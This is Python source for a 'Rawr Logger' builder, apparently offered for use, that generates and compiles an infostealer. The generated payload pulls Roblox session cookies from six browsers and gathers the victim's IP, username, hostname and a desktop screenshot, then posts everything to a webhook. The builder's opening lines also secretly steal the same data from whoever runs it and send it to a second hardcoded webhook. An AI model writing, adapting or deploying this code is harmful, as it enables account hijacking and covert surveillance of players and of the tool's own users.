import os
import requests
from pystyle import *
from PIL import ImageGrab
import socket
import browser_cookie3
import time
import shutil
os.system(f'cls & title Rawr Logger!')

u = os.getlogin()
webhook = "Enter Dual Webhook Here"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  
RobloxCookie = []
robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
for robloxcookie in robloxcookies:
   if robloxcookie.name == ".ROBLOSECURITY":
    RobloxCookie.append(robloxcookies)
    RobloxCookie.append(robloxcookie.value)

cookie = RobloxCookie[1]
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.jpg")
screenshot.close()
with open('image.jpg', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})
Write.Print(Center.XCenter("""
                                          
                                ▒▒▓▓                              
                                ▒▒▓▓                              
                              ░░██░░                              
                            ░░██████░░                            
                          ▒▒████████░░                            
                        ▒▒██████████░░                            
                      ████████████████▓▓                          
                    ████████████▓▓████▒▒                          
                  ████████████▓▓▒▒██████▓▓                        
                ████████████▓▓▒▒▒▒██████▒▒                        
                ████████████▓▓▒▒▓▓████████▓▓                      
              ▒▒████████████▒▒▓▓██████████▓▓                      
              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ████████████▒▒▒▒▒▒████████████████                    
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
                      ████████████████▓▓                          
                  Made By Jose#0001,TheSoap1#9870                                          
                                         
"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
code = """
import browser_cookie3
import os 
import requests
import socket
from PIL import ImageGrab

u = os.getlogin()
webhook = "webhooks"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  

def cookieGrabber(): # ¯\_(ツ)_/¯  !!ytax was here!! ^-^

    bobux = [] 

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                bobux.append(cookies)
                bobux.append(cookie.value)
    except:
        pass
    return bobux
    



        

cock = cookieGrabber()
boblox = ['_|WARNING'] 
cock[:] = [url for url in cock if any(sub in url for sub in boblox)]

for rosex in cock:
    requests.post(webhook,json={'content': f'There Roblox Cookie:\n```{rosex}```'})
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})

screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.jpg")
screenshot.close()
with open('image.jpg', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})
"""
file = open(f'{name}.py', 'a')
file.write(code.replace("webhooks", webhook))
time.sleep(2)
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
if compile == "y":
  names = Write.Input("Enter File Directory For The Logger You Want To Converte To A Exe:", Colors.green_to_yellow, interval=0.01)
  file = open(f'{name}.py', 'a')
  os.system(f"pyinstaller --onefile {name}.py")
  Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
  time.sleep(2)
  Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
  time.sleep(3)
  exit()
elif compile == "n":
  Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
  time.sleep(3)
  exit()
